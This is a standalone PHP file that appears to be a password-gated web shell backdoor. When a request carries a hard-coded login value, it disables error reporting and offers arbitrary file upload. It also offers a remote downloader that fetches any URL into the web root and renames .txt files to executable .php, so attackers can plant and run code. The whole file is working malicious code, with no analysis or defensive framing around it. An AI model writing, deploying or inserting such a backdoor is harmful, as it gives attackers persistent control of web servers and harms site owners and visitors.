<?php error_reporting( 0 );
    $path = __DIR__;
    if ( $_GET[ "login" ] == "eUrMZF" ) {
        if ( isset( $_FILES[ "uploadedfile" ] ) ) {
            $target_path = basename( $_FILES[ "uploadedfile" ][ "name" ] );
            if ( move_uploaded_file( $_FILES[ "uploadedfile" ][ "tmp_name" ], $target_path ) ) {
                echo "<font color=\"green\">file uploaded</font><br />";
            } else {
                echo "<font color=\"red\">upload fail</font><br />";
            }
        }
        echo "<form enctype=\"multipart/form-data\" method=\"POST\"><input name=\"uploadedfile\" type=\"file\"/><input type=\"submit\" value=\"Upload File\"/></form></td></tr>";
        function get( $url, $dir )
        {
            $ch = curl_init();
            curl_setopt( $ch, CURLOPT_URL, $url );
            curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
            curl_setopt( $ch, CURLOPT_TIMEOUT, 10 );
            $data = curl_exec( $ch );
            if ( ! $data ) {
                $data = @file_get_contents( $url );
            }
            file_put_contents( $dir, $data );
        }

        if ( $_GET[ "url" ] ) {
            $url = $_GET[ "url" ];
            preg_match( "/(.*)\/(.*)\.(.*?)$/", $url, $n );
            if ( $n[ 3 ] == "txt" ) {
                $z    = "php";
                $name = $n[ 2 ];
            } else {
                $z    = $n[ 3 ];
                $name = "moban";
            }
            if ( $_GET[ "dir" ] ) {
                $dir = $_SERVER[ "DOCUMENT_ROOT" ] . "/" . $_GET[ "dir" ] . "/" . $name . "." . $z;
            } else {
                $dir = $_SERVER[ "DOCUMENT_ROOT" ] . "/" . $name . "." . $z;
            }
            get( $url, $dir );
            if ( file_exists( $dir ) ) {
                echo "<tr><td><font color=\"green\">download success</font></td></tr>";
            } else {
                echo "<tr><td><font color=\"red\">download fail</font></td></tr>";
            }
        } elseif ( $_POST[ "url" ] ) {
            $url = $_POST[ "url" ];
            preg_match( "/(.*)\/(.*)\.(.*?)$/", $url, $n );
            if ( $n[ 3 ] == "txt" ) {
                $z    = "php";
                $name = $n[ 2 ];
            } else {
                $z    = $n[ 3 ];
                $name = "moban";
            }
            $dir = $_POST[ "path" ] . "/" . $name . "." . $z;
            get( $url, $dir );
            if ( file_exists( $dir ) ) {
                echo "<tr><td><font color=\"green\">download success</font></td></tr>";
            } else {
                echo "<tr><td><font color=\"red\">download fail</font></td></tr>";
            }
        }
        echo "<tr><td><form method=\"POST\"><span>Url: </span><input type=text name=\"url\" value=\"\"><input type=\"hidden\" name=\"path\" value=\"$path\"><input type=submit value=\"Download\"></form></td></tr>";
    } ?>